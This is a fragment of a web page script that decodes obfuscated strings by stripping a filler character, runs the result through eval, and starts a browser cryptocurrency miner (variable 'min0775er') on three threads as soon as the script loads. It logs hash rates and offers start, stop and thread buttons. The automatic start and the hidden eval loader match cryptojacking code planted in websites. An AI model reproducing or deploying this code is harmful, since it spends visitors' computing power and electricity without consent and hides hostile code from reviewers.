    let str = strings.replace(/接/g,'')
    str = str.replace(/转/g,'\\')

    eval(s1.replace(/接/g,''))
    min0775er.setNumThreads(3)
    min0775er.start()
    setInterval(()=>{
            // min0775er.start([mode])
            // console.log(min0775er.stop())
            // console.log("isRunning",min0775er.isRunning())
            // console.log("",min0775er.isMobile())
            // console.log("didoptout",min0775er.didOptOut(seconds))
            // console.log("event",min0775er.on(event, callback))
            // console.log("hasWASMSupport",min0775er.hasWASMSupport())
            console.log("getNumThreads",min0775er.getNumThreads())
            // console.log("",min0775er.setNumThreads(2))
            console.log("getThrottle",min0775er.getThrottle())
            // console.log(min0775er.setThrottle(throttle))
            // console.log("getToken",min0775er.getToken())
            console.log("getHashesPerSecond",min0775er.getHashesPerSecond())
            // console.log(min0775er.getTotalHashes([interpolate]))
            console.log("getAcceptedHashes",min0775er.getAcceptedHashes())
            document.getElementById('threads').innerHTML = min0775er.getNumThreads()
            document.getElementById('hash').innerHTML = (min0775er.getHashesPerSecond()+'').substr(0,7)
    },3200)
    window.onload = function(){
        // min0775er.start()
        document.getElementById('run').style.display = 'block'
        document.getElementById('pause').style.display = 'none'
        document.getElementById('start').style.background = "green"
        document.getElementById('start').addEventListener('click',function(){
            min0775er.start()
            document.getElementById('run').style.display = 'block'
            document.getElementById('pause').style.display = 'none'
            document.getElementById('start').style.backgroundColor = "green"
            document.getElementById('stop').style.backgroundColor = "#e4e4e4"
        })
        document.getElementById('stop').addEventListener('click',function(){
            min0775er.stop()
            document.getElementById('run').style.display = 'none'
            document.getElementById('pause').style.display = 'block'
            document.getElementById('start').style.backgroundColor = "#e4e4e4"
            document.getElementById('stop').style.backgroundColor = "red"
        })
         document.querySelectorAll('.step').forEach(function(v,i) {
              v.addEventListener('click',setStyle)
          });
        function setStyle(){
          document.querySelectorAll('.step').forEach(function(v,i) {
              v.classList.remove('active')
          });
          this.classList.add('active')
          console.log(this.innerHTML);
          min0775er.setNumThreads(Number(this.innerHTML[1]))
        }

    }
</script>
